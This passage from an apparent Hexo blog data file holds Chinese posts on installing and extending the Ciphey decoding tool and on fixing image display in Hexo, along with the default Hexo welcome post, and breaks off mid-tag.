这类常见编码的priority值就相对比较高,达到了0.9，而不常见的一般使用0.05，同样的，为了演示效果，将本编码的priority设置成了0.99。\n\n为了能够在Ciphey中使用新增的解码算法，一般建议将该py文件放置到Ciphey项目中的ciphey/basemods/Decoders目录下，然后重新编译生成模块。但是考虑到很多的使用者仅仅是临时的加入某一个算法，并不需要持久的使用，所以还有另外一种方式增加，直接在使用二进制程序ciphey 时增加参数 -m testLetter.py 即可。具体演示如下图所示，从图中可以看出，解码算法testletter 已经在Ciphey中起到了作用，并且直接输出了testletter 的解码值。\n\n![](Ciphey的概述/2022-12-21-22-10-16-2022-09-11-10-41-58-image.png)\n\n##### 在Ciphey中加入自定义破译算法\n\n和增加自定义解码算法类似的，增加自定义破译算法也是通过编写一个py文件来实现算法。除hash函数以外，其它的绝大多数密码算法都是存在密钥，所以破译算法实际上就是对弱口令的或者密钥空间的穷举。下面通过一个简单的示例来介绍如何添加。\n\n首先新建一个py文件，命名自定义，最好与密码算法相关，本示例使用 testcrack.py，内容如下：\n\n![](Ciphey的概述/2022-12-21-22-13-33-2022-09-11-10-46-23-image.png)\n\n整体的框架和自定义解码函数是一致的，需要特别指出的是 attemptCrack 函数，破译的逻辑就是在这个函数实现。为了方便演示，本示例直接返回了一个字符串“flag{this_is_diy_crackers}” 作为结果，这里需要注意的是，返回的是一个包含CrackResult对象的候选数组。直接使用命令 ciphey -m testcrack.py -t “abs3R4FASF4W34”，即可得到下图所示结果。\n\n![](Ciphey的概述/2022-12-21-22-10-53-2022-09-11-10-48-29-image.png)\n\n![](Ciphey的概述/2022-12-21-22-11-28-2022-09-11-19-00-55-image.png)\n\n## 在Windows下解决问题\n\n使用anaconda 的虚拟环境，使用python 3.8 及64 位建立tools ：\n\n![](Ciphey的概述/2022-12-25-20-06-01-2022-12-25-18-13-51-image.png)\n\n`pip install ciphey -i https://pypi.mirrors.ustc.edu.cn/simple`\n\n![](Ciphey的概述/2022-12-25-20-07-09-2022-12-25-19-35-44-image.png)\n\n使用中出现如下错误：\n\n![](Ciphey的概述/2022-12-25-20-08-46-2022-12-25-19-47-51-image.png)在对应的文件位置修改，加上 b ：\n\n![](Ciphey的概述/2022-12-25-20-08-22-2022-12-25-19-47-14-image.png)\n\n正常使用：\n\n![](Ciphey的概述/2022-12-25-20-09-20-2022-12-25-19-58-59-image.png)\n\n如果不是想要的结果可以输入 n，不是N，继续运算，直至正确结果，如上图。\n\n2022年羊城杯签到题可以直接解答：Misc 签个到 凯撒/ROT13,后base32\n\n![](Ciphey的概述/2023-08-31-20-48-51-image.png)\n","slug":"Ciphey的概述","published":1,"updated":"2024-11-15T13:17:13.284Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2u00068oi47cyu179e","content":"<p>Ciphey的概述</p>\n<p>无论是在日常的渗透测试、代码审计等工作，亦或是在CTF竞赛中，总是能碰到一些不能一眼看出编码规则的字符串，这些字符串的编码规则或许并不复杂，但由于有限的知识面和脑洞并不能马上解码，严重影响效率。市面上也有不少的自动识别编码并解码的工具，但是这些工具绝大多数都是基于匹配规则来实现的，也就是说都是基于已经存在的编码规则，才能够解码。本文需要讲解的Ciphey 解码工具，和以往的解码工具大不相同，是基于自然语言处理和人工智能实现的解码，无论是在准确率还是速度上，都有质的飞跃。</p>\n<p>Ciphey是在 Github 开源的一款使用python开发，基于自然语言处理和人工智能的密码学解码工具。截止到2022年7月，该项目已经获得了10.3k 个星标，多次登上 Github 项目精选。此处通过一个小小的例子来展示Ciphey的功能。</p>\n<p>Ciphey的安装非常简单，可以直接通过 Python 的包管理工具 pip 安装。直接在终端输入以下命令即可安装：</p>\n<p><code>pip install ciphey</code></p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-12-14-2022-09-11-10-26-47-image.png\" class=\"\">\n\n<p>windows下安装首先得有python环境，建议python版本3.7以上，推荐3.8</p>\n<p><code>pip install ciphey  -i http://mirrors.aliyun.com/pypi/simple/</code></p>\n<p><code>ciphey -t &quot;I44EOOLCIFUDQ5KLME======&quot;</code></p>\n<p>测试会出来这样的错误提示 ，UnicodeDecodeError: ‘gbk’ codec can’t decode byte 0xbf in position 695: illegal multibyte sequence，</p>\n<p>根据错误修改代码，主要是在读取文件的时候发生错误，将”r” 改为”rb”，如下图，问题出在regex_identifier.py,把”r” 改为”rb”。如下图</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-12-39-2022-09-11-10-24-43-image.png\" class=\"\">\n\n<p>Ciphey还封装了 docker 镜像，也可以直接运行docker容器，命令如下：</p>\n<p><code>docker run -it --rm remnux/ciphfey</code></p>\n<p><strong>¤ 文件输入模式：</strong> 直接将待解码内容以文本的形式传入 Ciphey，输入命令“ciphey -f encrypted.txt“ 即可，其中encrypted.txt中的内容就是输入文本。</p>\n<p><strong>¤ 宽松模式：</strong> 宽松模式指的是格式简单，直接将待解码文本使用双引号约束，并作为参数输入，如：ciphey –— “Encrypted input”。</p>\n<p><strong>¤ 严格模式：</strong> 通过参数 “-t“ 后接待解码内容。如：ciphey –t “Encrypted input”。</p>\n<blockquote>\n<p>There are 3 ways to run Ciphey.</p>\n<ol>\n<li>File Input <code>ciphey -f encrypted.txt</code></li>\n<li>Unqualified input <code>ciphey -- &quot;Encrypted input&quot;</code></li>\n<li>Normal way <code>ciphey -t &quot;Encrypted input&quot;</code></li>\n</ol>\n</blockquote>\n<h1 id=\"加入自定义算法到-Ciphey\"><a href=\"#加入自定义算法到-Ciphey\" class=\"headerlink\" title=\"加入自定义算法到 Ciphey\"></a><strong>加入自定义算法到</strong> Ciphey</h1><blockquote>\n<p>试想一下，如果有一天新的编码算法被提出，或者说在CTF竞赛时，参赛者已知某个字符串的编码规则里面存在某一个算法，而该算法并不在Ciphey当中，这将使得Ciphey的实用性大打折扣，所以Ciphey在设计时也意识到了这一点，于是事先就定义好了自定义算法的增加接口，允许使用者增加自定义的解码算法和破译算法。</p>\n</blockquote>\n<h5 id=\"在Ciphey中加入自定义解码算法\"><a href=\"#在Ciphey中加入自定义解码算法\" class=\"headerlink\" title=\"在Ciphey中加入自定义解码算法\"></a>在Ciphey中加入自定义解码算法</h5><p>首先创建一个 py 文件，名称可以自定义，但最好是与编码算法名称一致，比如这里取名testLetter.py ，内容大致如下：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-12-59-2022-09-11-10-38-39-image.png\" class=\"\">\n\n<p>这里需要注意的首先是类名，这类名实际上就表示了编码算法，本例中使用了TestLetter作为演示，函数逻辑则在decode里面实现。为了能让读者更加清晰的看到效果，本解码算法直接返回字符串“flag{this_is_a_test}”。另外需要注意的则是priority函数，priority 表示的是该编码算法的优先权，值越高，表示该算法出现的频率越高，反之则表示算法频率越低。所以在Ciphey中，Unicode 这类常见编码的priority值就相对比较高,达到了0.9，而不常见的一般使用0.05，同样的，为了演示效果，将本编码的priority设置成了0.99。</p>\n<p>为了能够在Ciphey中使用新增的解码算法，一般建议将该py文件放置到Ciphey项目中的ciphey&#x2F;basemods&#x2F;Decoders目录下，然后重新编译生成模块。但是考虑到很多的使用者仅仅是临时的加入某一个算法，并不需要持久的使用，所以还有另外一种方式增加，直接在使用二进制程序ciphey 时增加参数 -m testLetter.py 即可。具体演示如下图所示，从图中可以看出，解码算法testletter 已经在Ciphey中起到了作用，并且直接输出了testletter 的解码值。</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-10-16-2022-09-11-10-41-58-image.png\" class=\"\">\n\n<h5 id=\"在Ciphey中加入自定义破译算法\"><a href=\"#在Ciphey中加入自定义破译算法\" class=\"headerlink\" title=\"在Ciphey中加入自定义破译算法\"></a>在Ciphey中加入自定义破译算法</h5><p>和增加自定义解码算法类似的，增加自定义破译算法也是通过编写一个py文件来实现算法。除hash函数以外，其它的绝大多数密码算法都是存在密钥，所以破译算法实际上就是对弱口令的或者密钥空间的穷举。下面通过一个简单的示例来介绍如何添加。</p>\n<p>首先新建一个py文件，命名自定义，最好与密码算法相关，本示例使用 testcrack.py，内容如下：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-13-33-2022-09-11-10-46-23-image.png\" class=\"\">\n\n<p>整体的框架和自定义解码函数是一致的，需要特别指出的是 attemptCrack 函数，破译的逻辑就是在这个函数实现。为了方便演示，本示例直接返回了一个字符串“flag{this_is_diy_crackers}” 作为结果，这里需要注意的是，返回的是一个包含CrackResult对象的候选数组。直接使用命令 ciphey -m testcrack.py -t “abs3R4FASF4W34”，即可得到下图所示结果。</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-10-53-2022-09-11-10-48-29-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-11-28-2022-09-11-19-00-55-image.png\" class=\"\">\n\n<h2 id=\"在Windows下解决问题\"><a href=\"#在Windows下解决问题\" class=\"headerlink\" title=\"在Windows下解决问题\"></a>在Windows下解决问题</h2><p>使用anaconda 的虚拟环境，使用python 3.8 及64 位建立tools ：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-06-01-2022-12-25-18-13-51-image.png\" class=\"\">\n\n<p><code>pip install ciphey -i https://pypi.mirrors.ustc.edu.cn/simple</code></p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-07-09-2022-12-25-19-35-44-image.png\" class=\"\">\n\n<p>使用中出现如下错误：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-08-46-2022-12-25-19-47-51-image.png\" class=\"\">在对应的文件位置修改，加上 b ：\n\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-08-22-2022-12-25-19-47-14-image.png\" class=\"\">\n\n<p>正常使用：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-09-20-2022-12-25-19-58-59-image.png\" class=\"\">\n\n<p>如果不是想要的结果可以输入 n，不是N，继续运算，直至正确结果，如上图。</p>\n<p>2022年羊城杯签到题可以直接解答：Misc 签个到 凯撒&#x2F;ROT13,后base32</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2023-08-31-20-48-51-image.png\" class=\"\">\n","excerpt":"","more":"<p>Ciphey的概述</p>\n<p>无论是在日常的渗透测试、代码审计等工作，亦或是在CTF竞赛中，总是能碰到一些不能一眼看出编码规则的字符串，这些字符串的编码规则或许并不复杂，但由于有限的知识面和脑洞并不能马上解码，严重影响效率。市面上也有不少的自动识别编码并解码的工具，但是这些工具绝大多数都是基于匹配规则来实现的，也就是说都是基于已经存在的编码规则，才能够解码。本文需要讲解的Ciphey 解码工具，和以往的解码工具大不相同，是基于自然语言处理和人工智能实现的解码，无论是在准确率还是速度上，都有质的飞跃。</p>\n<p>Ciphey是在 Github 开源的一款使用python开发，基于自然语言处理和人工智能的密码学解码工具。截止到2022年7月，该项目已经获得了10.3k 个星标，多次登上 Github 项目精选。此处通过一个小小的例子来展示Ciphey的功能。</p>\n<p>Ciphey的安装非常简单，可以直接通过 Python 的包管理工具 pip 安装。直接在终端输入以下命令即可安装：</p>\n<p><code>pip install ciphey</code></p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-12-14-2022-09-11-10-26-47-image.png\" class=\"\">\n\n<p>windows下安装首先得有python环境，建议python版本3.7以上，推荐3.8</p>\n<p><code>pip install ciphey  -i http://mirrors.aliyun.com/pypi/simple/</code></p>\n<p><code>ciphey -t &quot;I44EOOLCIFUDQ5KLME======&quot;</code></p>\n<p>测试会出来这样的错误提示 ，UnicodeDecodeError: ‘gbk’ codec can’t decode byte 0xbf in position 695: illegal multibyte sequence，</p>\n<p>根据错误修改代码，主要是在读取文件的时候发生错误，将”r” 改为”rb”，如下图，问题出在regex_identifier.py,把”r” 改为”rb”。如下图</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-12-39-2022-09-11-10-24-43-image.png\" class=\"\">\n\n<p>Ciphey还封装了 docker 镜像，也可以直接运行docker容器，命令如下：</p>\n<p><code>docker run -it --rm remnux/ciphfey</code></p>\n<p><strong>¤ 文件输入模式：</strong> 直接将待解码内容以文本的形式传入 Ciphey，输入命令“ciphey -f encrypted.txt“ 即可，其中encrypted.txt中的内容就是输入文本。</p>\n<p><strong>¤ 宽松模式：</strong> 宽松模式指的是格式简单，直接将待解码文本使用双引号约束，并作为参数输入，如：ciphey –— “Encrypted input”。</p>\n<p><strong>¤ 严格模式：</strong> 通过参数 “-t“ 后接待解码内容。如：ciphey –t “Encrypted input”。</p>\n<blockquote>\n<p>There are 3 ways to run Ciphey.</p>\n<ol>\n<li>File Input <code>ciphey -f encrypted.txt</code></li>\n<li>Unqualified input <code>ciphey -- &quot;Encrypted input&quot;</code></li>\n<li>Normal way <code>ciphey -t &quot;Encrypted input&quot;</code></li>\n</ol>\n</blockquote>\n<h1 id=\"加入自定义算法到-Ciphey\"><a href=\"#加入自定义算法到-Ciphey\" class=\"headerlink\" title=\"加入自定义算法到 Ciphey\"></a><strong>加入自定义算法到</strong> Ciphey</h1><blockquote>\n<p>试想一下，如果有一天新的编码算法被提出，或者说在CTF竞赛时，参赛者已知某个字符串的编码规则里面存在某一个算法，而该算法并不在Ciphey当中，这将使得Ciphey的实用性大打折扣，所以Ciphey在设计时也意识到了这一点，于是事先就定义好了自定义算法的增加接口，允许使用者增加自定义的解码算法和破译算法。</p>\n</blockquote>\n<h5 id=\"在Ciphey中加入自定义解码算法\"><a href=\"#在Ciphey中加入自定义解码算法\" class=\"headerlink\" title=\"在Ciphey中加入自定义解码算法\"></a>在Ciphey中加入自定义解码算法</h5><p>首先创建一个 py 文件，名称可以自定义，但最好是与编码算法名称一致，比如这里取名testLetter.py ，内容大致如下：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-12-59-2022-09-11-10-38-39-image.png\" class=\"\">\n\n<p>这里需要注意的首先是类名，这类名实际上就表示了编码算法，本例中使用了TestLetter作为演示，函数逻辑则在decode里面实现。为了能让读者更加清晰的看到效果，本解码算法直接返回字符串“flag{this_is_a_test}”。另外需要注意的则是priority函数，priority 表示的是该编码算法的优先权，值越高，表示该算法出现的频率越高，反之则表示算法频率越低。所以在Ciphey中，Unicode 这类常见编码的priority值就相对比较高,达到了0.9，而不常见的一般使用0.05，同样的，为了演示效果，将本编码的priority设置成了0.99。</p>\n<p>为了能够在Ciphey中使用新增的解码算法，一般建议将该py文件放置到Ciphey项目中的ciphey&#x2F;basemods&#x2F;Decoders目录下，然后重新编译生成模块。但是考虑到很多的使用者仅仅是临时的加入某一个算法，并不需要持久的使用，所以还有另外一种方式增加，直接在使用二进制程序ciphey 时增加参数 -m testLetter.py 即可。具体演示如下图所示，从图中可以看出，解码算法testletter 已经在Ciphey中起到了作用，并且直接输出了testletter 的解码值。</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-10-16-2022-09-11-10-41-58-image.png\" class=\"\">\n\n<h5 id=\"在Ciphey中加入自定义破译算法\"><a href=\"#在Ciphey中加入自定义破译算法\" class=\"headerlink\" title=\"在Ciphey中加入自定义破译算法\"></a>在Ciphey中加入自定义破译算法</h5><p>和增加自定义解码算法类似的，增加自定义破译算法也是通过编写一个py文件来实现算法。除hash函数以外，其它的绝大多数密码算法都是存在密钥，所以破译算法实际上就是对弱口令的或者密钥空间的穷举。下面通过一个简单的示例来介绍如何添加。</p>\n<p>首先新建一个py文件，命名自定义，最好与密码算法相关，本示例使用 testcrack.py，内容如下：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-13-33-2022-09-11-10-46-23-image.png\" class=\"\">\n\n<p>整体的框架和自定义解码函数是一致的，需要特别指出的是 attemptCrack 函数，破译的逻辑就是在这个函数实现。为了方便演示，本示例直接返回了一个字符串“flag{this_is_diy_crackers}” 作为结果，这里需要注意的是，返回的是一个包含CrackResult对象的候选数组。直接使用命令 ciphey -m testcrack.py -t “abs3R4FASF4W34”，即可得到下图所示结果。</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-10-53-2022-09-11-10-48-29-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-21-22-11-28-2022-09-11-19-00-55-image.png\" class=\"\">\n\n<h2 id=\"在Windows下解决问题\"><a href=\"#在Windows下解决问题\" class=\"headerlink\" title=\"在Windows下解决问题\"></a>在Windows下解决问题</h2><p>使用anaconda 的虚拟环境，使用python 3.8 及64 位建立tools ：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-06-01-2022-12-25-18-13-51-image.png\" class=\"\">\n\n<p><code>pip install ciphey -i https://pypi.mirrors.ustc.edu.cn/simple</code></p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-07-09-2022-12-25-19-35-44-image.png\" class=\"\">\n\n<p>使用中出现如下错误：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-08-46-2022-12-25-19-47-51-image.png\" class=\"\">在对应的文件位置修改，加上 b ：\n\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-08-22-2022-12-25-19-47-14-image.png\" class=\"\">\n\n<p>正常使用：</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2022-12-25-20-09-20-2022-12-25-19-58-59-image.png\" class=\"\">\n\n<p>如果不是想要的结果可以输入 n，不是N，继续运算，直至正确结果，如上图。</p>\n<p>2022年羊城杯签到题可以直接解答：Misc 签个到 凯撒&#x2F;ROT13,后base32</p>\n<img src=\"/2024/11/15/Ciphey%E7%9A%84%E6%A6%82%E8%BF%B0/2023-08-31-20-48-51-image.png\" class=\"\">\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2024-11-12T14:59:11.335Z","updated":"1985-10-26T08:15:00.000Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2v00078oi4cjw81grf","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"hexo图片显示问题并不难","date":"2024-11-14T15:10:50.000Z","_content":"\n首先要介绍一下我的软件使用版本\n\n执行node -v    npm -v    hexo -v    检测到的版本分别是 v22.11.0    10.9.0    7.3.0\n\n使用的是MarkText.exe 编辑器，在file菜单下的Preferences菜单的Image选项：\n\n![](hexo图片显示问题并不难/2024-11-14-23-19-21-image.png)\n\n上图中，我原来的设置是 ./images/${filename} 所以按网上的配置怎么处理都是有问题不显示图片的，但可以把md文件对应的图片文件夹拷贝到发布后的public文件夹下面的images文件夹也可以正常显示，但这样比较麻烦。\n\n在你的博客文件夹下执行cmd命令并\n\nnpm install hexo-asset-img --save\n\n我使用的是上面这个插件，而不是hexo-asset-image，image这个怎么都无法显示图片。\n\n**【将_config.yml 文件中的post_asset_folder 选项设为 true 】**是必须的！只有这样才能在执行hexo g的时候，在public文件夹下对应md文件夹内生成图片。\n\n目前是正常的，但有个问题，新建文件后有图片插入的，需要执行>hexo clean    >hexo g  >hexo s  才能正常显示图片，如果只是>hexo g    >hexo s 还是不正常：\n\n![](hexo图片显示问题并不难/2024-11-14-23-40-00-image.png)\n\n如上图，产生的图片放在了最早的md文件图片文件夹下面，而且还出现了“不难”字样。\n\n按上图，在没有清除public目录后执行>hexo g产生的目录结果是这样的：\n\n![](hexo图片显示问题并不难/2024-11-14-23-43-59-image.png)\n\n最后附上操作截图：\n\n![](hexo图片显示问题并不难/2024-11-14-23-55-19-image.png)\n\n如果问题可以留言进行交流\n","source":"_posts/hexo图片显示问题并不难.md","raw":"---\ntitle: hexo图片显示问题并不难\ndate: 2024-11-14 23:10:50\ntags:\ncategories:\n- [other]\n---\n\n首先要介绍一下我的软件使用版本\n\n执行node -v    npm -v    hexo -v    检测到的版本分别是 v22.11.0    10.9.0    7.3.0\n\n使用的是MarkText.exe 编辑器，在file菜单下的Preferences菜单的Image选项：\n\n![](hexo图片显示问题并不难/2024-11-14-23-19-21-image.png)\n\n上图中，我原来的设置是 ./images/${filename} 所以按网上的配置怎么处理都是有问题不显示图片的，但可以把md文件对应的图片文件夹拷贝到发布后的public文件夹下面的images文件夹也可以正常显示，但这样比较麻烦。\n\n在你的博客文件夹下执行cmd命令并\n\nnpm install hexo-asset-img --save\n\n我使用的是上面这个插件，而不是hexo-asset-image，image这个怎么都无法显示图片。\n\n**【将_config.yml 文件中的post_asset_folder 选项设为 true 】**是必须的！只有这样才能在执行hexo g的时候，在public文件夹下对应md文件夹内生成图片。\n\n目前是正常的，但有个问题，新建文件后有图片插入的，需要执行>hexo clean    >hexo g  >hexo s  才能正常显示图片，如果只是>hexo g    >hexo s 还是不正常：\n\n![](hexo图片显示问题并不难/2024-11-14-23-40-00-image.png)\n\n如上图，产生的图片放在了最早的md文件图片文件夹下面，而且还出现了“不难”字样。\n\n按上图，在没有清除public目录后执行>hexo g产生的目录结果是这样的：\n\n![](hexo图片显示问题并不难/2024-11-14-23-43-59-image.png)\n\n最后附上操作截图：\n\n![](hexo图片显示问题并不难/2024-11-14-23-55-19-image.png)\n\n如果问题可以留言进行交流\n","slug":"hexo图片显示问题并不难","published":1,"updated":"2024-11-15T14:19:47.606Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2w00088oi4h1xmd2vb","content":"<p>首先要介绍一下我的软件使用版本</p>\n<p>执行node -v    npm -v    hexo -v    检测到的版本分别是 v22.11.0    10.9.0    7.3.0</p>\n<p>使用的是MarkText.exe 编辑器，在file菜单下的Preferences菜单的Image选项：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-19-21-image.png\" class=\"\">\n\n<p>上图中，我原来的设置是 .&#x2F;images&#x2F;${filename} 所以按网上的配置怎么处理都是有问题不显示图片的，但可以把md文件对应的图片文件夹拷贝到发布后的public文件夹下面的images文件夹也可以正常显示，但这样比较麻烦。</p>\n<p>在你的博客文件夹下执行cmd命令并</p>\n<p>npm install hexo-asset-img –save</p>\n<p>我使用的是上面这个插件，而不是hexo-asset-image，image这个怎么都无法显示图片。</p>\n<p><strong>【将_config.yml 文件中的post_asset_folder 选项设为 true 】</strong>是必须的！只有这样才能在执行hexo g的时候，在public文件夹下对应md文件夹内生成图片。</p>\n<p>目前是正常的，但有个问题，新建文件后有图片插入的，需要执行&gt;hexo clean    &gt;hexo g  &gt;hexo s  才能正常显示图片，如果只是&gt;hexo g    &gt;hexo s 还是不正常：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-40-00-image.png\" 